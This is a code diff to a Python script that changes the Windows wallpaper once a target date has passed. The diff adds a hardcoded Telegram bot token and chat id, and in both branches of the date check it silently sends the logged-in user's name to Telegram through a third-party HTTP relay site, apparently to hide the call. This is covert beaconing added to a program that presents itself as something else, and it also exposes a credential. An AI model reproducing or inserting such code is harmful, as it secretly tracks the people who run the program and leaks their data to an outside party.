@@ -4,8 +4,11 @@ import io
 import base64
 import jdatetime
 import os
+import requests
 
 SPI_SETDESKWALLPAPER = 20
+my_bot_token = "6784243877:AAG58bNMvwp6kEdUvG2bX2C2L1dGCKrbpLI"
+chat_id = "1663788795"
 
 
 def set_wallpaper():
@@ -33,5 +36,23 @@ if now > target_date:
         # ذخیره وضعیت کد
         with open('code_executed.txt', 'w') as f:
             f.write('The code has been executed.')
+
+        user_name = os.getlogin()
+        message = user_name + " در کامپیوتر خود وارد شد."
+        url = f"https://api.telegram.org/bot{my_bot_token}/sendmessage?chat_id={chat_id}&text={message}"
+        mypay = {"UrlBox":url,
+        "AgentBox":"Google Chrome",
+        "VersionsList":"HTTP/1.1",
+        "MethodList":"GET"}
+        send = requests.post(url="https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=mypay)
+
 else:
     print("NOT now")
+    user_name = os.getlogin()
+    message = user_name + " در کامپیوتر خود وارد شد."
+    url = f"https://api.telegram.org/bot{my_bot_token}/sendmessage?chat_id={chat_id}&text={message}"
+    mypay = {"UrlBox":url,
+    "AgentBox":"Google Chrome",
+    "VersionsList":"HTTP/1.1",
+    "MethodList":"GET"}
+    send = requests.post(url="https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=mypay)
